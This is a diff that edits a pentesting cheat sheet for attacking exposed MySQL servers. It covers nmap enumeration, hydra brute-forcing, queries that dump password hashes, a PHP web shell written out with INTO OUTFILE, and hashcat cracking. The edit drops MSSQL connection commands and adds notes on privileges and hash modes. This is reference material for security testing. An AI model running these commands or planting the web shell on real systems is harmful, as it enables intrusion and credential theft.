@@ -8,7 +8,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 3306 --script mysql-info,mysql-users,mysql-databases $IP
+nmap -sV -p 3306 --script mysql-info $IP
 ```
 
 ---
@@ -17,27 +17,11 @@ nmap -p 3306 --script mysql-info,mysql-users,mysql-databases $IP
 
 ```bash
 mysql -h $IP -u root
-sqlcmd -S MSSQL_HOST -U DB_USER -P "DB_PASS" -y 30 -Y 30
+mysql -h $IP -u $USERNAME -p
 ```
 
-!!! tip ""
+!!! tip "TLS compatibility"
     If you get a TLS error, add `--ssl-mode=DISABLED` (MySQL 5.7+) or `--skip-ssl` (MariaDB).
-
-### Connect to MSSQL with `sqsh` or Impacket
-
-#### Linux
-
-```bash
-sqsh -S MSSQL_HOST -U DB_USER -P 'DB_PASS' -h
-impacket-mssqlclient -p 1433 DB_USER@MSSQL_HOST
-```
-
-#### Windows
-
-```bash
-sqsh -S MSSQL_HOST -U 'DOMAIN\DB_USER' -P 'DB_PASS' -h
-impacket-mssqlclient 'DOMAIN/DB_USER:DB_PASS@MSSQL_HOST' -windows-auth
-```
 
 ---
 
@@ -53,10 +37,11 @@ hydra -L users.txt -P passwords.txt mysql://$IP
 
 ```sql
 SELECT user, host FROM mysql.user;                          -- list users
-SHOW GRANTS FOR 'root'@'localhost';                        -- check privileges
-SHOW databases;
-USE database_name; SHOW tables;
-SELECT * FROM table_name;
+SHOW GRANTS FOR CURRENT_USER;                              -- current privileges
+SHOW VARIABLES LIKE 'secure_file_priv';                   -- allowed file-write directory
+SHOW DATABASES;
+USE DATABASE_NAME; SHOW TABLES;
+SELECT * FROM TABLE_NAME;
 SELECT host, user, authentication_string FROM mysql.user;  -- dump password hashes
 ```
 
@@ -70,12 +55,12 @@ If the MySQL user has `FILE` privilege, write a web shell:
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-Access at `http://$IP/shell.php?cmd=id`.
+`INTO OUTFILE` requires the `FILE` privilege, cannot overwrite an existing file, and is restricted by `secure_file_priv` when that variable is set. Access the result at `http://$IP/shell.php?cmd=id` only when the selected directory is actually served by the web application.
 
 Dump a table to disk:
 
 ```sql
-SELECT * INTO OUTFILE '/tmp/dump.txt' FROM table_name;
+SELECT * FROM TABLE_NAME INTO OUTFILE '/tmp/dump.txt';
 ```
 
 ---
@@ -86,5 +71,4 @@ SELECT * INTO OUTFILE '/tmp/dump.txt' FROM table_name;
 hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-!!! tip "Real-world"
-    Remote MySQL exposure is almost always a misconfiguration, it's supposed to be localhost-only. When you find it, check `FILE` and `EXECUTE` privileges immediately. `FILE` gives you LFI/write; UDF exploitation via `EXECUTE` is a path to OS-level RCE but requires uploading a shared library.
+Mode `300` applies to MySQL 4.1/5 `mysql_native_password` hashes. Identify the hash format before selecting a mode; newer authentication plugins do not use this format.
